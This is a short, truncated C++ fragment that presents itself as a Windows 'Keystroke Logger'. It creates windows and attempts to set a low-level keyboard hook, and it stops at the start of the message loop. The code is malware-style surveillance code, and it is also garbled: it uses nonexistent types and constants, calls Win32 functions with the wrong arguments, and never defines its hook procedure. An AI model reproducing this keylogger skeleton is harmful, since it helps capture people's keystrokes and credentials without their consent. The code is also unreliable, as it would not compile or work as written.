int main() {
    HWND hwnd;
    HWND hwndMain = CreateWindowEx(0, "Keystroke Logger", 0, 0, 0, 0, WS_OVERLapped | WS_VISIBLE, 0, 0, 0, 0);

    if (!hwndMain) {
        // Handle error
        cout << "Failed to create window." << endl;
        return 1;
    }

    // Set the window's text
    SetWindowText(hwndMain, "Keystroke Logger");

    // Set up the keyboard hook
    // Function prototype: LPHK KeyboardHookProc(KEYBOARD hooked as per Win32 API
    static LPHK kbrdhook = 0;

    // Define the callback function
    auto kbrdhookproc = keyboardHookProc;

    // Set the hook
    kbrdhook = SetWindowsHook(hwndMain, WH_KEYBOARD_LL, kbrdhookproc);

    // Check if the hook was installed successfully
    if (!kbrdhook) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    // Initialize message queue
    HWND hwndQueue = CreateWindowEx(0, "Message Queue", 0, 0, 0, 0, WS_POPUP | WS_VISIBLE, 0, 0, 0, 0);
    if (!hwndQueue) {
        cout << "Failed to create message queue." << endl;
        return 1;
    }

    // Get the message queue handle
    HWND hQueue = GetWindow(hwndQueue);

    // Start the message loop
    MSG msg;
